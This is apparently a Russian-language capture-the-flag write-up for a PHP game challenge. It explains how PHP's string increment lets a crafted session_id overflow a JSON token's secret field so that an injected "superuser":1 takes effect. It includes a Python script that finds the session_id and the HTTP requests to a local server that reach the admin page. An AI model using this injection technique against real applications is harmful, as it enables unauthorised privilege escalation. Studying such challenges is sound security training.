При отправке запроса на вход в игру создается json токен пользователя и записывается в php session.

```php
$gamma = "ABC12345678901234567890123456789";
$token = '{"name":"' . $name . '","age":"' . $age . '","difficulty":"' . $difficulty . '","secret":"                                ","superuser":0}';
```

Пользователь может влиять на name и secret. Оба длиной в 32 символа. secret получается путем ксора gamma с session_id и инкремента байта после ксора.
session_id может содержать только символы a-zA-Z0-9-,
Атакующий может сразу внедрить "superuser":1 через name, но он не может отбросить конечную часть "superuser":0, что приводит к некорректному токену.
Решение заключается в том, что в php символы 'z', 'Z', '9' при увеличении выдают 'aa', 'AA', '10' соответственно. Необходимо подобрать
такой session_id (учитывая разрешенные символы), чтобы его ксор с gamma имел в себе как минимум 3 символа 'z', 'Z' или '9', которые после инкремента позволят выйти за пределы значения secret и начать переписывать ключ superuser. Достаточно изменить хотя бы 1 символ ключа, чтобы был действителен внедренный через name ключ superuser.
В решении ниже закрывается ключ secret и открывается новый путем внедрения трех байт "," (с кавычками) чтобы строка superuser стала концом нового названия ключа.

```python3
from string import ascii_letters, digits

allowed = ascii_letters + digits + '-,'  # a-z, A-Z, 0-9 and '-,'
gamma = 'ABC12345678901234567890123456789'
exploit_id = ''  # searching for session_id

keys_separator = '","'  # нужно внедрить сепаратор для открытия нового json ключа
i = 0
need_separator = True  # был ли внедрен сепаратор
found_extender = 0  # сколько внедрено Zz9

while i < 32:
    need_extender = found_extender < 3  # 3 экстендера будет достаточно для переписывания "," перед superuser
    found = False  # найден новый символ session_id
    if need_separator:
        cur_xor_index = i + found_extender
        s1 = chr(ord(gamma[cur_xor_index]) ^ ord(keys_separator[0]))
        s2 = chr(ord(gamma[cur_xor_index + 1]) ^ ord(keys_separator[1]))
        s3 = chr(ord(gamma[cur_xor_index + 2]) ^ ord(keys_separator[2]))
        if s1 in allowed and s2 in allowed and s3 in allowed:  # может ли session_id содержать эти символы
            exploit_id += s1 + s2 + s3
            need_separator = False
            found = True
            i += 3
            continue
    if need_extender:
        for b in allowed:
            if chr(ord(gamma[i]) ^ ord(b)) in 'Zz9':
                exploit_id += b
                found_extender += 1
                found = True
                break
    if not found:
        for b in allowed:
            if chr(ord(gamma[i]) ^ ord(b)) in allowed:  # в json не должно быть непечатаемых байт
                exploit_id += b
                found = True
                break
    if not found:
        print(f"Error with {i}")
        exit(0)
    i += 1

print(f"{need_separator=}")
print(exploit_id)
# cnakhiaaaaaaaaaaaaaaaaaaaaaaaaaa
```

Далее нужно сделать запрос на создание токена с внедрением своего superuser и войти в админку


```
POST / HTTP/1.1
Host: 127.0.0.1:8088
Content-Length: 83
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=cnakhiaaaaaaaaaaaaaaaaaaaaaaaaaa

username=<@urlencode>admin","superuser":1,"a":"</@urlencode>&difficulty=easy&age=23
```

```
GET /admin.php HTTP/1.1
Host: 127.0.0.1:8088
Cookie: PHPSESSID=cnakhiaaaaaaaaaaaaaaaaaaaaaaaaaa
```